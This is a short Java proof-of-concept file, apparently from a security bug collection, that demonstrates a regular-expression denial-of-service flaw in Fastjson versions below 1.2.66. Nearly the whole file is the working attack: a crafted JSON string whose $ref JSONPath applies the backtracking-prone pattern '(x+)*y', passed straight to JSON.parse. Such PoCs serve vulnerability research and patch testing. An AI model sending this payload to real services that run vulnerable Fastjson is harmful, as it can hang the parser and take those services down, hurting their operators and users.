package com.security.bug.fastjson.dos;

import com.alibaba.fastjson.JSON;

/**
 * 正则DOS Fastjson < 1.2.66
 *

 */
public class ReDOSPoc {

  public static void main(String[] args) {
    String payload = "{\"aaaaa\":\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\",\"regex\":{\"$ref\":\"$[aaaaa rlike '(x+)*y']\"}}";
    JSON.parse(payload);
  }
}
